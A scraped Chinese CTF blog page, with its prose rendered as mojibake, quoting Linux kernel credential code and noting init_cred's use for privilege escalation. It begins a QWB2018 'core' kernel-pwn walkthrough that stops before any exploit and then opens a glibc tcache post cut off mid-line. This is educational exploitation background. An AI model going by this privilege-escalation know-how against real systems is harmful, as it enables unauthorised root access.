<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux/include/linux/cred.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __put_cred(<span class="keyword">struct</span> cred *);</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">exit_creds</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">copy_creds</span><span class="params">(<span class="keyword">struct</span> task_struct *, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="keyword">struct</span> cred *<span class="title function_">get_task_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">cred_alloc_blank</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_creds</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_exec_creds</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">abort_creds</span><span class="params">(<span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="keyword">struct</span> cred *<span class="title function_">override_creds</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">revert_creds</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">change_create_files_as</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="keyword">struct</span> inode *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_security_override</span><span class="params">(<span class="keyword">struct</span> cred *, u32)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_security_override_from_ctx</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="type">const</span> <span class="type">char</span> *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_create_files_as</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="keyword">struct</span> inode *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">cred_fscmp</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *, <span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°å®ç°å’Œ<code>init_cred</code>è¿™ä¸ªé¢„å®šä¹‰å¯¹è±¡éƒ½åœ¨<code>linux/kernel/cred.c</code>ä¸­å®ç°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_ROOT_UID KUIDT_INIT(0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_ROOT_GID KGIDT_INIT(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">	.usage			= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	.subscribers		= ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">	.magic			= CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	.uid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.gid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.suid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.sgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.euid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.egid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.fsuid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.fsgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.securebits		= SECUREBITS_DEFAULT,</span><br><span class="line">	.cap_inheritable	= CAP_EMPTY_SET,</span><br><span class="line">	.cap_permitted		= CAP_FULL_SET,</span><br><span class="line">	.cap_effective		= CAP_FULL_SET,</span><br><span class="line">	.cap_bset		= CAP_FULL_SET,</span><br><span class="line">	.user			= INIT_USER,</span><br><span class="line">	.user_ns		= &amp;init_user_ns,</span><br><span class="line">	.group_info		= &amp;init_groups,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªinit_credæ˜¯ä¸€ä¸ªå…·æœ‰æœ€é«˜æƒé™çš„cred,å¯ä»¥è€ƒè™‘ä½¿ç”¨å®ƒæˆ–è€…å…¶æ‹·è´è¿›è¡Œææƒ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_creds - Prepare a new set of credentials for modification</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a new set of task credentials for modification.  A task&#x27;s creds</span></span><br><span class="line"><span class="comment"> * shouldn&#x27;t generally be modified directly, therefore this function is used to</span></span><br><span class="line"><span class="comment"> * prepare a new copy, which the caller then modifies and then commits by</span></span><br><span class="line"><span class="comment"> * calling commit_creds().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Preparation involves making a copy of the objective creds for modification.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns a pointer to the new creds-to-be if successful, NULL otherwise.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Call commit_creds() or abort_creds() to clean up.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_creds</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	validate_process_creds();</span><br><span class="line"></span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">	old = task-&gt;cred;</span><br><span class="line">	<span class="built_in">memcpy</span>(new, old, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred));</span><br><span class="line"></span><br><span class="line">	new-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">	<span class="type">atomic_set</span>(&amp;new-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(new, <span class="number">0</span>);</span><br><span class="line">	get_group_info(new-&gt;group_info);</span><br><span class="line">	get_uid(new-&gt;user);</span><br><span class="line">	get_user_ns(new-&gt;user_ns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	key_get(new-&gt;session_keyring);</span><br><span class="line">	key_get(new-&gt;process_keyring);</span><br><span class="line">	key_get(new-&gt;thread_keyring);</span><br><span class="line">	key_get(new-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	new-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(new, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	validate_creds(new);</span><br><span class="line">	<span class="keyword">return</span> new;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	abort_creds(new);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_creds);</span><br></pre></td></tr></table></figure>







<h3 id="å¼ºç½‘æ¯2018-core"><a href="#å¼ºç½‘æ¯2018-core" class="headerlink" title="å¼ºç½‘æ¯2018-core"></a>å¼ºç½‘æ¯2018-core</h3><p>ç»™äº†å››ä¸ªä¸œè¥¿bzImage  core.cpio  start.sh  vmlinux,å…¶ä¸­</p>
<p>bzImageæ˜¯å†…æ ¸é•œåƒ</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.15.8 (simple@vps-simple) <span class="comment">#19 SMP Mon Mar 19 18:50:28 CST 2018, RO-rootFS, swap_dev 0x6, Normal VGA</span></span><br></pre></td></tr></table></figure>

<p>vmlinuxæ˜¯å¸¦ç¬¦å·è¡¨çš„elfæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=1d8344e71a82bc43821029796ef65bebfe8e65c3, not stripped</span><br></pre></td></tr></table></figure>

<p><code>start.sh</code>æ˜¯<code>qemu</code>å¯åŠ¨å†…æ ¸çš„è„šæœ¬,</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# <span class="built_in">cat</span> start.sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p><code>-initrd  ./core.cpio </code>æŒ‡å®šä½¿ç”¨<code>core.cpio</code>ä½œä¸ºå†…å­˜æ–‡ä»¶ç³»ç»Ÿ</p>
<p><code>kaslr </code>å¼€å¯äº†å†…æ ¸åœ°å€éšæœºåŒ–</p>
<p><code>-s</code> å¼€å¯äº†è°ƒè¯•</p>
<p>è§£åŒ…core.cpioçœ‹çœ‹æ–‡ä»¶ç³»ç»Ÿé‡Œæœ‰å•¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file core.cpio</span><br><span class="line">core.cpio: gzip compressed data, last modified: Fri Oct  5 14:08:36 2018, max compression, from Unix</span><br></pre></td></tr></table></figure>

<p>å‘ç°é¦–å…ˆæœ‰ä¸€å±‚gzipå‹ç¼©</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# mkdir core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# cp core.cpio ./core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# cd core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# mv core.cpio core.cpio.gz</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# gunzip core.cpio.gz</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# file core.cpio</span><br><span class="line">core.cpio: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™å·²ç»æ²¡æœ‰gzipåŒ…äº†,æ˜¯ä¸€ä¸ªcpioå½’æ¡£æ–‡ä»¶,è§£åŒ…ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# cpio -idm &lt; core.cpio</span><br></pre></td></tr></table></figure>

<p>è§£åŒ…ä¹‹åæ˜¯ä¸€ä¸ªlinuxç›®å½•æ ‘,å€¼å¾—æ³¨æ„çš„æ˜¯æ ¹ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªshellè„šæœ¬,gen_cpio.shå’Œinit</p>
<p>è¿™ä¸ªgen_cpio.shä¼šé€’å½’æŸ¥æ‰¾å½“å‰ç›®å½•ä¸ºæ ¹çš„ç›®å½•æ ‘æ‰“åŒ…æˆcpioå½’æ¡£æ–‡ä»¶,ä¹Ÿå°±æ˜¯åˆ¶ä½œæ–‡ä»¶ç³»ç»Ÿç”¨çš„</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æœ‰äº”æ¡å…³é”®æŒ‡ä»¤</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms		//å°†kallsymså†…æ ¸ç¬¦å·è¡¨æ‹·è´åˆ°.tmpä¸‹é¢,è¿™å°±æ„å‘³ç€æ™®é€šç”¨æˆ·å¯ä»¥è¯»å–</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict		//ä¸å…è®¸æ™®é€šç”¨æˆ·è¯»å–kallsymså†…æ ¸ç¬¦å·</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict	//ä¸å…è®¸æ™®é€šç”¨æˆ·è¯»å–dmesgå†…æ ¸æ¶ˆæ¯</span><br><span class="line">insmod /core.ko			//åŠ è½½äº†ä¸€ä¸ªå†…æ ¸æ¨¡å—å«core	</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh		//å½“å‰ç”¨æˆ·<span class="built_in">id</span>ä¸º1000,ä¸æ˜¯root</span><br></pre></td></tr></table></figure>

<p>ida64æ‰“å¼€core.koçœ‹çœ‹æ˜¯ä»€ä¹ˆä¸œè¥¿</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/10/28/tcache/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/28/tcache/" class="post-title-link" itemprop="url">glibc2.27 tcache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-28 01:53:00 / Modified: 01:53:53" itemprop="dateCreated datePublished" datetime="2023-10-28T01:53:00+08:00">2023-10-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><p>glibc2.26ä¹‹å</p>
<p>â€œå¦‚ä¸ºæ­»ç‹‚ï¼Œåˆ™äº‹æ— ä¸æˆã€‚â€â€“&lt;&lt;æœ€åçš„æ­¦å£«&gt;&gt;</p>
<h2 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"><span class="comment">//æ ¹æ®tcacheä¸‹æ ‡æ±‚è§£å…¶ä¸­å †å—çš„å¤§å°</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">//æ ¹æ®å †å—å¤§å°æ±‚è§£å¯¹åº”tcacheä¸‹æ ‡</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"><span class="comment">//æ ¹æ®å 